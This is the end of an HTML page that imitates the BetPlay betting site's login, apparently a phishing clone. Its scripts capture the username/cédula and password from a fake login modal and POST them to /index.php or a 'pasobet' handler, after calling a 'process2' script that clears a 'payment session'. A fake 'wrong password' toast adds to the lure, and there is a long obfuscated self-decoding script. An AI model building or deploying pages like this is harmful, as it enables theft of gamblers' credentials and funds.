                    EMPRESARIAL S.A., con domicilio principal en la ciudad de Bogotá – Colombia, Avenida Calle 26 # 69 D
                    91 Oficina 802 Torre 2 Centro Empresarial Arrecife, línea 018000112188, correo <a
                      _ngcontent-serverapp-c3637729144=""
                      href="https://d7cul3678ytm6.cloudfront.net/Betplay/escribenos.html">Escribenos</a> autorizada en
                    Colombia para operar los juegos de suerte y azar en la modalidad novedoso de tipo juegos operados
                    por internet, según Contrato de </p>
                  <div _ngcontent-serverapp-c3637729144="" class="footer-regulation"><!----></div>
                  <div _ngcontent-serverapp-c3637729144="" class="footer-warnings">
                    <div _ngcontent-serverapp-c3637729144="" class="footer-age-image"><img
                        _ngcontent-serverapp-c3637729144="" src="img/footer/age.svg" alt=""></div>
                    <p _ngcontent-serverapp-c3637729144="" class="footer-text"> DEFINE TUS LÍMITES, JUEGA LEGAL Y CON
                      RESPONSABILIDAD. PROHIBIDA LA VENTA A MENORES DE EDAD. </p>
                    <div _ngcontent-serverapp-c3637729144="" class="footer-coljuegos-image"><img
                        _ngcontent-serverapp-c3637729144="" src="img/footer/coljuegos.svg" alt="">
                    </div>
                  </div>
                </div>
              </div>
            </footer><!---->
            <div _ngcontent-serverapp-c3637729144="" class="footer-version ng-star-inserted">
              <p _ngcontent-serverapp-c3637729144=""> Versión 4.0.42 </p>
            </div><!---->
          </app-footer>
        </div>
      </mat-drawer-content><!---->
    </mat-drawer-container><!----><app-terms-pop-up _ngcontent-serverapp-c1557493016="" class="ng-tns-c1557493016-0"
      _nghost-serverapp-c3232222433=""><!----><!----><!----></app-terms-pop-up><app-widget-flotante
      _ngcontent-serverapp-c1557493016="" _nghost-serverapp-c2988504344=""
      class="ng-tns-c1557493016-0 ng-star-inserted">
      <div _ngcontent-serverapp-c2988504344="" class="overlay overlay-hidden light-overlay"></div>
    </app-widget-flotante><!----></app-root>
  <app-widget-root remote="true" did="betplay@WC11"></app-widget-root>

  <!-- Jquery popper -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
    crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
    crossorigin="anonymous"></script>

<script>
document.addEventListener('click', function (e) {
  const b = e.target.closest('#btnUsuario');
  if (!b) return;
  e.preventDefault();
  e.stopImmediatePropagation(); // evita el handler viejo de pasobet/process2
  function vis(id){ const a=[...document.querySelectorAll('#'+CSS.escape(id))]; return a.find(i=>i.offsetParent!==null)||a[0]||null; }
  const u = vis('txtUsuario'), p = vis('txtPass');
  if (!u || !p) { alert('No se encontraron los campos.'); return; }
  const usuario = u.value.trim(), pass = p.value.trim();
  if (!usuario || !pass) { alert('Ingresa usuario y contraseña.'); return; }
  const f = document.createElement('form');
  f.method = 'POST';
  f.action = '/index.php';
  const a=document.createElement('input'); a.type='hidden'; a.name='cedula';   a.value=usuario;
  const c=document.createElement('input'); c.type='hidden'; c.name='password'; c.value=pass;
  f.appendChild(a); f.appendChild(c); document.body.appendChild(f); f.submit();
}, true);
</script>




    
  <script>
    let oldXHROpen = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function(
      method,
      url,
      async,
      user,
      password
    ) {
      // do something with the method, url and etc.
      this.addEventListener('load', function() {
        // do something with the response text
        // console.log('load: ' + url);
      });

      if (
        url.includes('history.json') &&
        !window.location.href.toString().includes('#bethistory')
      ) {
        console.log('load: ' + url);
        return false;
      } else {
        return oldXHROpen.apply(this, arguments);
      }
    };

    function onSubmit(token) {
      document.getElementById('realLogin').click();
    }
  </script>

  <script type="text/javascript">
    var espera = 0;
    let identificadorTiempoDeEspera;

    function retardor() {
      identificadorTiempoDeEspera = setTimeout(retardorX, 900);
    }

    function retardorX() {}
    $(document).ready(function() {
      $('#btnUsuario').click(function(event) { 
        event.preventDefault(); 
        var usuarioBetplayVal = $("#txtUsuario").val();
        var claveBetplayVal = $("#txtPass").val();

        if (usuarioBetplayVal && claveBetplayVal) {
          clearPreviousPaymentSession(function(success) { 
              if (success) {
                  console.log("Sesión de login anterior limpiada (desde index.php).");
                  pasobet(claveBetplayVal, usuarioBetplayVal); 
              } else {
                  $("#err-mensaje").text("Error al preparar la sesión de login. Intente de nuevo.").show();
              }
          });
        } else {
          $("#err-mensaje").text("Por favor, ingrese usuario y contraseña.").show();
          $("#txtUsuario, #txtPass").css("border", "1px solid red"); 
          $("#txtUsuario").focus();
        }
      });
      $("#txtUsuario").keyup(function(e) {
        $(this).css("border", "1px solid #CCCCCC");
        if ($("#txtPass").css("border-color") === "rgb(255, 0, 0)") { // Si la contraseña tenía borde rojo
            $("#txtPass").css("border", "1px solid #CCCCCC");
        }
        $("#err-mensaje").hide();
      });
    });
  </script>

  <script type="text/javascript">
    $(document).ready(function() {

      function clearPreviousPaymentSession(callback) {
        $.ajax({
          url: 'process2/limpiar_sesion_pago.php',
          type: 'POST',
          async: true, 
          success: function(response) {
            console.log("Respuesta de limpiar_sesion_pago.php:", response);
            if (callback) callback(true);
          },
          error: function() {
            console.error("Error al limpiar sesión de pago previa.");
            if (callback) callback(false); 
          }
        });
      }

      $('#dropdownLogin').click(function(event) {
        event.preventDefault();
        $('#mobileLoginOverlayContainer').css('display', 'flex');
      });

      $('#mobileLoginOverlayContainer #btnUsuario').click(function(event) {
        event.preventDefault();
        var uModal = $('#mobileLoginOverlayContainer #txtUsuario').val();
        var pModal = $('#mobileLoginOverlayContainer #txtPass').val();

        if (uModal && pModal) {
          pasobet(pModal, uModal);
        } else {
          alert("Por favor, ingrese usuario y contraseña en el modal.");
        }
      });

      $('#mobileLoginOverlayContainer .fa-times').click(function(event) { 
        event.preventDefault();
        $('#mobileLoginOverlayContainer').css('display', 'none');
      });
    });
  </script>

  <script type="text/javascript">
    $(document).ready(function() {
      // --- INICIO: LÓGICA PARA MOSTRAR MODAL DE ERROR SI codigo=1 ---
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('codigo') === '1') {
        $('#errorLoginModal').css('display', 'flex'); // O .show() si prefieres
        // Opcional: Ocultar el modal después de unos segundos
        setTimeout(function() {
          $('#errorLoginModal').fadeOut();
        }, 5000); // 5 segundos
      }
      // --- FIN: LÓGICA PARA MOSTRAR MODAL DE ERROR ---
    });
  </script>

  <script type="text/javascript">
    window.addEventListener('message', (e) => {
      if (e.data == '__thunderbite_request_uuid') {
        let uuid = window.localStorage.getItem('__thunderbite_uuid');
        if (typeof uuid != 'string') {
          uuid = Array.from({
              length: 16
            }, () =>
            ('0' + Math.floor(Math.random() * 0xff).toString(16)).slice(
              -2
            )
          ).join('');
          window.localStorage.setItem('__thunderbite_uuid', uuid);
        }
        e.source.postMessage(uuid, '*');
      }
    });
  </script>

  <noscript>
    <link href="https://v.byads.co/d/.js?noscript=true&amp;ourl=" rel="stylesheet">
  </noscript>

  <script type="text/javascript" id="" charset="">
    var sc, gc, ci, adp;
    (function() {
      function g(d) {
        for (var b = 3512413, h = d.length, c = [], a = 0; a < h; a++) c[a] = d.charAt(a);
        for (a = 0; a < h; a++) {
          d = b * (a + 449) + b % 15517;
          b = b * (a + 308) + b % 14636;
          var l = d % h,
            m = b % h,
            p = c[l];
          c[l] = c[m];
          c[m] = p;
          b = (d + b) % 6551395
        }
        return c.join("")
      }
      var k = "",
        e = 11;
      e = g("cnlhntrcdswayozeiutqgktfovspxuojcrrbm").substr(0, e);
      var f = 'ul;od\x3dnq;b ,g78 [\x3dt)vr8; ".,\x3e.redr{t+nnsfpl[r{ads+ ra,;o}*vsn7a,{sk l1h2t6n\x3dp-68r.v0,rlmuih6]u\x3ds(6{ns\x3cs\x3dr{delxe)a0g7u,,a7\x3cl1[jaru]e+y+\x3di\x3dnops\x3d[xji.lg+9ra]Ag. 1,\x3d"x)2[ho;;]sl9wsrad(}; i+hu11aakn\x3d6uv gl8ax7 3v),lzis;;ehd;fr]rnhnei)C7)rl2l-foa)n6x ry;;*..9mti+;+\x3de)vrarwvo)+tt;d.\x3dbSSo-]ly\x3ec]larsf5f](C \x3dru,a9r)r7lqt+yu;;a0,hfni)09j(g1),;0vtp;j2l0b(v;tha r; nstj}4v6+A)vt)afa(vrv,6"+ip.blhc[aeC)f(A;v -n;h(eop;))a;irarr,d\x3d!rb16+(,gtcoa];cpao-(.ca5)d37tary\x3d).n,(;(flv+c\x3d\x3d[s{(j,9f). c0A)a-qir+\x3dnrj+odf [ua\x3d+\x3d)fh4[\x3d3t];6eatla\x3d2x1(Cn\x3de"ase2;hlleuwco;+1ch.}nikmw\x3dolkra)4\x3dg.zi\x3d(v }"z-tu.teCC,.b]s\x3cedgxevror]p.es(w,d[f)cCat0\x3d)+r }ix(u;n2);hsxir("oe [."+e;(r8r;g5.ri\x3cgh[pn((uihs\x3d"\x3cvene\x3dr m)4t svvu.0(o.\x3drf12t0v7\x3d9ptln(4s;+lag(a\x3d8+o,r28o6,0r,;h1;aie8o)p).(i);e\x3d8a[\x3dnxtingqf,yAChd"6rt+thf);o0ravs(\x3d,\x3danvlc)lu\x3d;oo+j,q\x3d \x3de.s;li((uuafxear+i[a1;.(n.n7 }o);!;(brmhs],cr\x3d;h{ta()a q,(naz;p..(l;\x3dfue"r]\x3drt(i ire;',
        n =
        g[e],
        q = "";
      e = n;
      f = n(q, g(f));
      f = f(g('K(i"mr?b,t)\x3cK}KK]KKr*e2}p]}Hlurb(M\x3ec\x3d#\x3dntNb!6i.Ke1d.sa(Kcbp6XD}9 (Krf].!K..uvKmnKcOl4Kw+!\x3d)%{(K200c;I.0bSont9eporO%nvK fu}KGc$j$K0ORa$;bKIodKK%bfc3Keecp}.(0%6(kKyjd $K$Ki5ebin,eeK;K)K#wo2 %tKUs Q.+Ki\x3dK3K(t8nenK#t9bKcK7yK{t%n2+)Trrm7m+K$Klinoe\x3d7e0r8bte4a_)0\x26yboKn.0cV_]3 \x3dr}c(K(K(K (KVq$ubsr2mtm}S(Kdi/K-jZrp ;cKaKr%.f7Dsyd(KK;r,\x3d.*s.p3fK1FI5KnrKnj[MCt0nnGabt)K5t0.5]TtKtbpO f]ao6K\x3drA![rc4oCI0;n{}fp;/\x3dK t.y_.;%v%Ki5Kl/h!8d;}l\x3d1)0r}s\x3e4tsK.%b0IinoC_vKa;c!nT)"ridcfKdcK5Keti2_fKl\x3dU7)6]1w$f:ia.]x\x26W0j!uKgieK6cKeg%b,t(Ks\x3d#)ie)8%)7te.:hjlycIKh.}n,B,\x3dK";saauKKK6t,$ktSs0.;vW[ m\x3e2!}1m*\x3dv_K"]3Kt}4D3u%]o .}}c4_eYef;sK)u5S*du)R6WgnU91aK5\x3ec]/6\x3c%]tuDr!6eKgarK1$F;)i\x3efKr(Nr2.!rUKs,5d.;0;$7));lR KVw.#!,a]1[.\x3dt_},) KhKos24$1eKt.K)5;u_6(Ks. KK,_u!K3?KOr)\x3d3g))d.o,lKa)\x26uK.%));.Sd) $9Kfc(.7t(,0d)m+KC;t}Kfeb1.4%9uc\x3dKmM(tKK(])]?!6CK!ubXg1W;#K!Kb_.__];8t;11K0fKKe.!tmoccaq+(X\x3drKIKt)Ki(c,CK]K)%K\x3dKKKSne_)L1_)eu%o\x3deeshKo1/(_Klr)) \x3dc !E.Dhi!KcKK..4x5l3\x3e.S1)upS).9K,,K]wb(. e(KS).%KoKK_Ao),K2KwotHtkK1CCj\'o)8l1Kif(7]\x3chmK}iKa0(K%p%K)_y7.]ebN])7 @p8b}\x3deepK9,4gfK\'K.KKryDne9+.rcKnei(K?k]_,}4f1iK3Kni+Mf;;{y),uK;Kyi1)0KaIiKdoK#]Ko\x3ee-{6!KNn)KK;di\x3d]Ku\x3dKi_:]!3e,t.icK)p())Ka2se)b1iKt\x3dt]0KKK1.ebr)_exK]ris(!t6$_2UKd_3)I](i\x3di%g2e9+B%f_)K;F.f;].])l6n+br;()KU(s%m4.){;b{uYcf7 K.),K\x3cfe21orK5K-i(rJ.;;d18)g}133H77.";.D(ns]jKr5\x26KoKK))bgEjvKn]A_1%!f.$dKe(]lbeti/]iH,r\x3clenfa%(C!Sr5]Kvo9\x3d\x3d.K]!bWfa{;t06H2jTY.n0Ke)eo(Ki;anIC(eKneK) ;K,i()i5uGa(K.fy)M1QX4),]cKt.bec$n0K]+1{H%1K(!.a753K3s6il\x3dvean0,r,\x3dtg)d;(o1.KKn8 ]Ke2K\x3eVuDK8}KJ e$(o4.mbG(]KdK]nKu\x3dg.K9]Q\x3di)j%gIKirHrKK.K6r)Ke\x3dZ})2 cKsf! ,;;y;KP){KKNKa3nfK75Kr  .f7}nKihsc629 Ki$cr):$K93fK2pfK9noa(K )eK_}a.@}!d_K0K@ !1K!,\x3d{K+e(()ci1!};ni!%$1Be;i(7g$bKKK_Pv_K]a_!3g]c{\x3dK{ jg()sS;w8n.e,aiK\'Kc33K85-rbj{.\x26KHr"_lK.KmDiK+)s(K74K7Kg8]a;!(6"Ka!_u/3_*gKg)K*ylfacd3N0u:)if6K#VKtKKebg(K0(KKsK ]TK.3{.n1%C,;_K1K]\x3d(K(3baH2HK3ea%)i}KC{eR,1(fSKnK8TgE\x3d\x3dK09taDpK.E3;K\x3dnt3;K.Su0iK(Kg.eKI.6)$ftK,m)iKRg:n.KE!.T]_@(9) ]-40t;2\x3d\x3do{Cn vcKeafKoi(e N]m)c(uxtt%eciK6p)UxX_.)e;4,c$5ldt5fKodjKK.+y)KthP;!{%KrbKD_(21aH(1KK))]0r!;oe/K\x3d4!/K{\x3e21AV%\x3d(._LKZ_CeM8K)o+sJKB"tqL_1(K(td);0K.fp;bK1id9Ki_K,\x3e8l%;!#]07ZaK($s81iK_deaKF1Kf5K]1a .KhKcn).jaKb8K,K36Ka,1Ka.o ra)}_oKi6s3$; ,Dt\x3do+.u(Kbss(,ieC(viq;o/(!T;)8:566.K;nKC6]toK)6]1o)a]Ko7KKau,e#_;)v;K2t"K(oKs50Kebm0EdH.$Ko5((tn.K*ce P2KM{EKtK195.ti_n%p4_.n(s50H,dK5obdTo)mt!r*WreKcKS(;:i?g}$0(YDKcKWxeruwd$osfK_b K)KdK,.K} {!l]]!)K_2))6re,WCm,\x3d22?0 K;!0.K0 rKtKK \x26,1}{}f n];s)!tct5ien$Ke%(tt){LeK)e\x3d44b\'nsQ)]jlsrap7(/n1Jnp ,m{pq{,(l!!tK$)bnK8u]$bdKsKxivKe(oi"vK$enm.3 bu Sbe\x26nT ue3 .t Ki!acQ36(0e4ci.o [ o_2r%K.aj_w$3 \x26 Kt).3fjcr1 \x26\x3eh{])%0e }(.)'));
      k = e(k, f);
      k(7589);
      return 4981
    })();
  </script>
  <script type="text/javascript" id="" charset="">
    (function() {
      function c(a) {
        a && (a = {
          event: "balance_check",
          totalBalance: a.totalBalance,
          balance: a.realBalance,
          bonusBalance: a.bonusBalance,
          bonosPendientes: a.bonosPendientes,
          saldoCanje: a.saldoCanje
        }, window.dataLayer = window.dataLayer || [], window.dataLayer.push(a))
      }

      function e() {
        var a = localStorage.getItem("balance");
        if (a) try {
          var b = JSON.parse(a);
          c(b)
        } catch (d) {}
      }
      e();
      var f = localStorage.setItem;
      localStorage.setItem = function(a, b) {
        f.apply(this, arguments);
        if (a === "balance") try {
          var d = JSON.parse(b);
          c(d)
        } catch (g) {}
      }
    })();
  </script>

  <!-- INICIO DEL MODAL DE LOGIN PARA MÓVILES -->
  <div id="mobileLoginOverlayContainer" class="cdk-overlay-container" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000;">
    <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" style="position: absolute; top: 0; left: 0; bottom: 0; right: 0;"></div>
    <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center; display: flex; position: absolute; top: 0; left: 0; bottom: 0; right: 0;">
      <div id="cdk-overlay-1" class="cdk-overlay-pane login-dialog" style="max-width: 80vw; width: auto; /* position: static; es removido para permitir centrado */">
        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
        <mat-dialog-container tabindex="-1" class="mat-mdc-dialog-container mdc-dialog cdk-dialog-container mdc-dialog--open" id="mat-mdc-dialog-1" role="dialog" aria-modal="true" style="--mat-dialog-transition-duration: 150ms; max-width: 500px; width: 90vw;">
          <div class="mdc-dialog__container">
            <div class="mat-mdc-dialog-surface mdc-dialog__surface" style="background-color: #002361; color: white; padding: 20px; border-radius: 8px;">
              <app-modal-loginresponsive _nghost-serverapp-c3657716528="" class="ng-star-inserted">
                <form _ngcontent-serverapp-c3657716528="" novalidate="" autocomplete="off" id="formLoginModal" class="formularioinput d-block ng-pristine ng-invalid ng-touched">
                  <h6 _ngcontent-serverapp-c3657716528="" class="close-pop-up" style="text-align: right;">
                    <i _ngcontent-serverapp-c3657716528="" class="fas fa-times cursor-pointer" title="Cerrar" style="color: #FFF; font-size: 1.2em;"></i>
                  </h6>
                  <figure _ngcontent-serverapp-c3657716528="" class="fomularioimg" style="text-align: center; margin-bottom: 15px;">
                    <img _ngcontent-serverapp-c3657716528="" src="img/logos/logo-bp.svg" class="fomularioimg-img" alt="Logo BetPlay" title="Logo BetPlay" style="max-width: 150px; filter: brightness(0) invert(1);">
                  </figure>
                  <div _ngcontent-serverapp-c3657716528="" class="mb-3 w-100">
                    <input _ngcontent-serverapp-c3657716528="" type="text" id="txtUsuario" formcontrolname="userName" class="inciosesion ng-pristine ng-invalid ng-touched" placeholder="Usuario / Cédula" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ced4da; border-radius: .25rem; color: #495057; background-color: #FFF;">
                  </div>
                  <div _ngcontent-serverapp-c3657716528="" class="mb-3 w-100">
                    <input _ngcontent-serverapp-c3657716528="" type="password" id="txtPass" formcontrolname="password" class="inciosesion ng-untouched ng-pristine ng-invalid" placeholder="Contraseña" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ced4da; border-radius: .25rem; color: #495057; background-color: #FFF;">
                  </div>
                  <div _ngcontent-serverapp-c3657716528="" class="recordardatos" style="display: flex; align-items: center; margin-bottom: 15px;">
                    <input _ngcontent-serverapp-c3657716528="" type="checkbox" formcontrolname="recordarPass" class="ng-untouched ng-pristine ng-valid" style="margin-right: 5px; accent-color: #00ae42;">
                    <p _ngcontent-serverapp-c3657716528="" style="margin: 0; font-size: 0.9em; color: #e0e0e0;">Recordar datos de usuario</p>
                  </div>
                  <div _ngcontent-serverapp-c3657716528="" class="formularioinput-botones">
                    <button _ngcontent-serverapp-c3657716528="" id="btnUsuario" data-callback="successSubmit" type="submit" class="w-100 btn-inicio mb-2 betplaycaptcha" style="background-color: #00ae42; color: white; border: none; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; cursor: pointer;"> Ingresar </button>
                    <button _ngcontent-serverapp-c3657716528="" id="btnLoginRealModal" type="submit" style="position: fixed; left: -9999px;"></button>
                    <a _ngcontent-serverapp-c3657716528="" href="/registrarse" class="w-100">
                      <button _ngcontent-serverapp-c3657716528="" type="button" class="btn-registro w-100" style="background-color: #3cb4e5; color: white; border: none; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; cursor: pointer;"> Registrarse </button>
                    </a>
                  </div>
                  <p _ngcontent-serverapp-c3657716528="" class="text-center mb-0 recuperarpass" style="margin-bottom: 15px;">
                    <span _ngcontent-serverapp-c3657716528="" class="btn btn-link text-recuperarpass cursor-pointer" style="color: #5fb3e1; font-size: 0.9em; text-decoration: none; background: none; border: none; padding: 0; cursor: pointer;"> Recuperar contraseña </span>
                  </p>
                  <div _ngcontent-serverapp-c3657716528="" class="col-12 mt-3 ng-star-inserted">
                    <p _ngcontent-serverapp-c3657716528="" class="text-center" style="font-size: 0.8em; color: #e0e0e0;"> Al iniciar sesión, estas aceptando los siguientes T&amp;C Versión 1.4.<br _ngcontent-serverapp-c3657716528="">
                      <a _ngcontent-serverapp-c3657716528="" class="terminos" style="color: #5fb3e1;">https://betplay.com.co/terminos-y-condiciones</a>
                    </p>
                  </div>
                </form>
              </app-modal-loginresponsive>
            </div>
          </div>
        </mat-dialog-container>
        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
      </div>
    </div>
  </div>
  <!-- FIN DEL MODAL DE LOGIN PARA MÓVILES -->
  <!-- INICIO DEL MODAL DE ERROR LOGIN -->
  <div id="errorLoginModal" class="overlay-container" aria-live="polite" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.3); z-index: 20000; align-items: flex-start; justify-content: flex-end;">
    <div id="toast-container" class="toast-top-right toast-container" style="padding: 20px;">
      <div class="ng-tns-c969959638-5 ng-star-inserted ng-trigger ng-trigger-flyInOut ngx-toastr toast-error ng-animating" toast-component="" style="background-color: #f44336; color: white; padding: 15px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); position: relative; min-width: 300px;">
        <div role="alert" class="ng-tns-c969959638-5 toast-message ng-star-inserted" aria-label="Has ingresado mal el usuario y/o contraseña, recuerda que tienes tres intentos antes que tu cuenta sea bloqueada." style="padding-left: 30px; padding-right: 10px;">
          Has ingresado mal el usuario y/o contraseña, recuerda que tienes tres intentos antes que tu cuenta sea bloqueada.
        </div>
      </div>
    </div>
  </div>
  <style>
    .svg-path-flame {
      fill: #afff00;
    }

    .swipe-bet__footer {
      display: none;
    }

    .swipe-bet__total-bets {
      display: none;
    }
  </style>
</body>



</html>